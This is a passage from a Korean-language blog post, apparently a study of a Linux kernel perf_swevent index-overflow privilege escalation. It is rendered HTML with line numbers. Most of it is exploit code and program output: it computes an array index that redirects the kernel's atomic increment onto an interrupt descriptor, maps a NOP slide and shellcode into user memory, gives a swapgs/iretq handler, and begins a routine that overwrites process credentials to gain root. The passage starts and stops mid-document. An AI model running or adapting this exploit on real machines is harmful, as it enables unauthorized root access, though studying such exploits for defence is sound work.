-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-<span class='line-number'>112</span>
-<span class='line-number'>113</span>
-<span class='line-number'>114</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">...</span>
-</span><span class='line'><span class="n">main</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">idt_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81df8000</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">target_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">idt_addr</span> <span class="o">+</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0x48</span><span class="p">);</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">perf_swevent_enabled</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81ef7160</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">calc_perf</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">peek</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="p">{</span>
-</span><span class='line'>        <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idt</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">config</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int32_t</span> <span class="n">idx32</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">uidx64</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int64_t</span> <span class="n">idx64</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">map</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#define BASE    0x380000000</span>
-</span><span class='line'><span class="cp">#define SIZE    0x010000000 </span><span class="c1">// 256 mega</span>
-</span><span class='line'><span class="cp">#define KSIZE   0x002000000 </span><span class="c1">// 32 mega</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">BASE</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
-</span><span class='line'>            <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUSE</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">BASE</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;mmap error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">idx64</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">peek</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;atomic_dec(): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">peek</span><span class="p">);</span>
-</span><span class='line'>    <span class="o">*</span><span class="n">peek</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">config</span> <span class="o">=</span> <span class="mh">0xfffffffe</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">idx64</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">peek</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">];</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;atomic_dec(): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">peek</span><span class="p">);</span>
-</span><span class='line'>    <span class="o">*</span><span class="n">peek</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">SIZE</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>        <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">map</span><span class="o">+</span><span class="n">i</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">tmp</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
-</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;scanned i: %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">i</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">peek</span> <span class="o">-</span> <span class="mh">0x380000000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;caculated i: %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;A: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="mh">0xffffffff</span><span class="o">*</span><span class="mi">2</span><span class="p">]);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;B: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">BASE</span> <span class="o">+</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">));</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;C: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">perf_swevent_enabled</span> <span class="o">+</span> <span class="mh">0xffffffff</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="c1">// perf_swevent_enabled 를 i 를 가지고 구해낼 수 있다.</span>
-</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">BASE</span> <span class="o">+</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">calc_perf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="n">b</span><span class="o">-</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0xffffffff</span><span class="o">*</span><span class="mi">4</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calc_perf: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">calc_perf</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;perf_swevent_enabled: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">perf_swevent_enabled</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="c1">// perf_swevent_enabled 의 주소를 구했으면,</span>
-</span><span class='line'>    <span class="c1">// target_addr 로 튈 수 있는, 어레이 index 를 계산한다.</span>
-</span><span class='line'>    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">calc_perf</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">target_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;X: %lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Y: %lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Z: %ld</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="o">-</span><span class="n">b</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;-Z/4: %ld</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)(</span><span class="n">b</span><span class="o">-</span><span class="n">a</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">config</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span><span class="o">-</span><span class="n">a</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span>
-</span><span class='line'><span class="cp">#if 0</span><span class="c"></span>
-</span><span class='line'><span class="c">    // exploit 의 공식. 하지만 안쓴다.</span>
-</span><span class='line'><span class="c">    config = </span>
-</span><span class='line'><span class="c">        (uint32_t) </span>
-</span><span class='line'><span class="c">        (-i +16 +((((uint64_t)idt_addr&amp;0xffffffff)-0x80000000) / 4));</span>
-</span><span class='line'><span class="cp">#endif</span>
-</span><span class='line'>    <span class="n">idx32</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span> <span class="c1">// 원래 code 의 실수를 시뮬레이션한다.</span>
-</span><span class='line'>    <span class="n">idx64</span> <span class="o">=</span> <span class="n">idx32</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">mem</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">];</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calculated mem: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mem</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;target_addr: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">target_addr</span><span class="p">);</span>
-</span><span class='line'>    <span class="c1">// kernel 에서는 이제 atomic_inc() 가 들어간다.</span>
-</span><span class='line'>    <span class="c1">// Interrupt descriptor 의 상위 0xffffffff -&gt; 0x00000000 으로 변한다.</span>
-</span><span class='line'>    <span class="c1">// Interrupt vector 의 어드레스가 user-land 로 바뀐다.</span>
-</span><span class='line'>    <span class="c1">// user-land 에 깔아둔 NOP slide + shellcode 로 튈 수 있다.</span>
-</span><span class='line'>    <span class="c1">// atomic_inc(perf_swevent_enabled[idx64]);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">calc2</span>
-</span><span class='line'><span class="n">atomic_dec</span><span class="p">()</span><span class="o">:</span> <span class="mh">0x381ef715c</span>
-</span><span class='line'><span class="n">atomic_dec</span><span class="p">()</span><span class="o">:</span> <span class="mh">0x381ef7158</span>
-</span><span class='line'><span class="n">scanned</span> <span class="nl">i</span><span class="p">:</span> <span class="mi">7</span><span class="n">bdc56</span>
-</span><span class='line'><span class="n">calculated</span> <span class="nl">i</span><span class="p">:</span> <span class="mi">7</span><span class="n">bdc56</span>
-</span><span class='line'><span class="nl">A</span><span class="p">:</span> <span class="mh">0x381ef7158</span>
-</span><span class='line'><span class="nl">B</span><span class="p">:</span> <span class="mh">0x381ef7158</span>
-</span><span class='line'><span class="nl">C</span><span class="p">:</span> <span class="mh">0x381ef7158</span>
-</span><span class='line'><span class="nl">calc_perf</span><span class="p">:</span> <span class="mh">0xfffffffb81ef7160</span>
-</span><span class='line'><span class="nl">perf_swevent_enabled</span><span class="p">:</span> <span class="mh">0xfffffffb81ef7160</span>
-</span><span class='line'><span class="nl">X</span><span class="p">:</span> <span class="mi">81</span><span class="n">ef7160</span>
-</span><span class='line'><span class="nl">Y</span><span class="p">:</span> <span class="mi">81</span><span class="n">df8048</span>
-</span><span class='line'><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="mi">4</span><span class="o">:</span> <span class="o">-</span><span class="mi">261190</span>
-</span><span class='line'><span class="nl">config</span><span class="p">:</span> <span class="o">-</span><span class="mi">261190</span>
-</span><span class='line'><span class="nl">idx32</span><span class="p">:</span> <span class="o">-</span><span class="mi">261190</span>
-</span><span class='line'><span class="nl">idx64</span><span class="p">:</span> <span class="o">-</span><span class="mi">261190</span>
-</span><span class='line'><span class="n">calculated</span> <span class="nl">mem</span><span class="p">:</span> <span class="mh">0xffffffff81df8048</span> <span class="o">&lt;---</span> <span class="n">index</span> <span class="n">overflow</span> <span class="err">로</span> <span class="err">맞춰냈다</span><span class="p">.</span>
-</span><span class='line'><span class="nl">target_addr</span><span class="p">:</span> <span class="mh">0xffffffff81df8048</span> <span class="o">&lt;---</span> <span class="o">*</span>
-</span><span class='line'><span class="err">$</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이 정도로 바꿔놓고 <code>int $0x4</code> 를 발생시키면, kernel panic 이 날텐데, 대충 코드가 어디로 튈지 알 수 있다.</p>
-
-<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define KSIZE       0x002000000 </span><span class="c1">// 32 megabytes</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>exploit code 상에서는
-<code>kbase = idt.addr &amp; 0xff000000</code> 로 해서, 0x02000000 바이트를 확보한다.</p>
-
-<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">asm</span> <span class="nf">volatile</span><span class="p">(</span><span class="s">&quot;sidt %0&quot;</span> <span class="o">:</span> <span class="s">&quot;=m&quot;</span> <span class="p">(</span><span class="n">idt</span><span class="p">));</span>
-</span><span class='line'><span class="n">kbase</span> <span class="o">=</span> <span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">code</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">kbase</span><span class="p">,</span><span class="n">KSIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span>
-</span><span class='line'>        <span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="n">KSIZE</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">code</span> <span class="o">+=</span> <span class="p">(</span><span class="n">KSIZE</span><span class="o">-</span><span class="mi">1024</span><span class="p">);</span>
-</span><span class='line'><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="o">&amp;</span><span class="n">fix_idt_and_overwrite_creds</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
-</span><span class='line'><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="o">-</span><span class="n">shellcode_sz</span><span class="p">,</span><span class="n">shellcode</span><span class="p">,</span><span class="n">shellcode_sz</span><span class="p">);</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>로 NOP slide + shellcode 를 깐다.</p>
-
-<h4>Shellcode</h4>
-
-<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">swapgs</span>
-</span><span class='line'><span class="n">callq</span> <span class="o">&lt;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mh">0xd</span><span class="o">&gt;</span>
-</span><span class='line'><span class="n">swapgs</span>
-</span><span class='line'><span class="n">iretq</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>인터럽트 핸들러는 <code>swapgs</code> 로 들어가야한다. 그리고 <code>iretq</code> 로 리턴.</p>
-
-<h4>task_struct &amp; cred</h4>
-
-<p>target 이 되는 구조체.</p>
-
-<p>우선 kernel stack 에서 thread_info 를 찾는다. thread_info 에서 task_struct 을 찾는다.</p>
-
-<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">thread_info</span> <span class="p">{</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">struct</span> <span class="n">task_struct</span> <span class="p">{</span>
-</span><span class='line'>    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">real_cred</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kt">uid_t</span>       <span class="n">uid</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">gid_t</span>       <span class="n">gid</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uid_t</span>       <span class="n">suid</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">gid_t</span>       <span class="n">sgid</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uid_t</span>       <span class="n">euid</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">gid_t</span>       <span class="n">egid</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uid_t</span>       <span class="n">fsuid</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">gid_t</span>       <span class="n">fsgid</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">unsigned</span>    <span class="n">securebits</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">kernel_cap_t</span>    <span class="n">cap_inheritable</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">kernel_cap_t</span>    <span class="n">cap_permitted</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">kernel_cap_t</span>    <span class="n">cap_effective</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">...</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>fix_idt_and_overwrite_creds</h4>
-
-<p>Interrupt handler 에서 <code>fix_idt_and_overwrite_creds()</code> 를 call 한다. 일단 user-land 에 memcpy 로 function 을 쭉 copy 해놓긴 했는데, relative addressing 으로 런타임에 다 resolving 이 될까? 이건 좀 체크해봐야겠다.</p>
-
-<ol>
-<li>하여튼, handler 에서 호출을 하였으니,</li>
-<li>kernel stack 에서 놀게 될 것이고,</li>
-<li>변수들이 kernel stack 에 자리잡을테고,</li>
-<li>거기서 thread_info 를 찾아낸다.</li>
-<li>~(8192-1) 로 masking 해서.</li>
-</ol>
-
-
-<p>kernel memory 를 스캔해서, heuristic 하게 cred structure 를 찾는다. 찾으면 각종 uid/gid 들을 0 으로 세팅한다. 그러면 root 가 된다.</p>
-
-<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="nf">fix_idt_and_overwrite_creds</span><span class="p">()</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">k</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="c1">// 동적으로 알아내야할 정보들이 있어서</span>
-</span><span class='line'>    <span class="c1">// 일단 marker 로 place 를 holding 하고.</span>
-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">uids</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
-</span><span class='line'>        <span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
-</span><span class='line'>        <span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span>
-</span><span class='line'>        <span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span>
-</span><span class='line'>        <span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-</span><span class='line'>    <span class="p">};</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="c1">// kernel stacks are usually 8192 bytes on Linux.</span>
-</span><span class='line'>    <span class="c1">// thus, we can take the address of a stack allocated variable</span>
-</span><span class='line'>    <span class="c1">// and mask off a few bits to find</span>
-</span><span class='line'>    <span class="c1">// what is the base of the kernel stack</span>
-</span><span class='line'>    <span class="c1">// where the thread_info struct lives.</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="c1">// current is (hopefully) pointing at the start of thread_info </span>
-</span><span class='line'>    <span class="c1">// which contains</span>
-</span><span class='line'>    <span class="c1">// the current task_struct pointer.</span>
-</span><span class='line'>    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">current</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">**</span><span class="p">)(</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">uids</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">-</span><span class="mi">8192</span><span class="p">)</span> <span class="p">);</span>
-</span><span class='line'>    <span class="c1">// the task_struct is allocated is kernel memory.</span>
-</span><span class='line'>    <span class="c1">// grab the top 28 bits to use as an estimate</span>
-</span><span class='line'>    <span class="c1">// to determine if other addresses are kernel addresses.</span>
